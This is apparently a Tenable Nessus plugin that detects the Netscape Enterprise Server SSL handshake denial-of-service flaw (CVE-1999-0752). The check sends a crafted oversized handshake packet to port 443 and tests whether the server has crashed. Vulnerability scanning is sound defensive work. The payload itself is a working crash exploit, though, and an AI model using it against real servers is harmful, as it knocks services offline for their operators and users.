#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10155);
  script_version ("$Revision: 1.27 $");
  script_cve_id("CVE-1999-0752");
  script_bugtraq_id(516);
  script_xref(name:"OSVDB", value:"121");

  script_name(english:"Netscape Enterprise Server SSL Handshake DoS");
  script_summary(english:"Crashes the remote SSL server");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a denial of service attack.'
  );

  script_set_attribute(
    attribute:'description',
    value:"There is a SSL handshake bug in the remote secure web server that
could lead to a denial of service attack. 

An attacker may use this flaw to prevent your site from working properly."
  );

  script_set_attribute(
    attribute:'solution',
    value:'Apply the appropriate vendor supplied patch (see links)'
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://help.netscape.com/business/filelib.html#SSLHandshake'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_dependencie("find_service1.nasl", "http_version.nasl");
  script_require_keys("www/iplanet");
  script_require_ports(443);
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

port = 443;
if(get_port_state(port))
{
 soc = open_sock_tcp(port, transport:ENCAPS_IP);
 if(soc)
 {
 s = raw_string(46, 46, 8,
 0x01, 0x03, 0x00, 0x00, 0x0c,
 0x00, 0x00, 0x00, 0x10, 0x02,
 0x00, 0x80, 0x04, 0x00, 0x80,
 0x00, 0x00, 0x03, 0x00, 0x00,
 0x06) + crap(length:65516, data:".");
 send(socket:soc, data:s);
 close(soc);
 sleep(5);
 soc = open_sock_tcp(port);
 if(!soc)security_warning(port);
 else close(soc);
 }
}
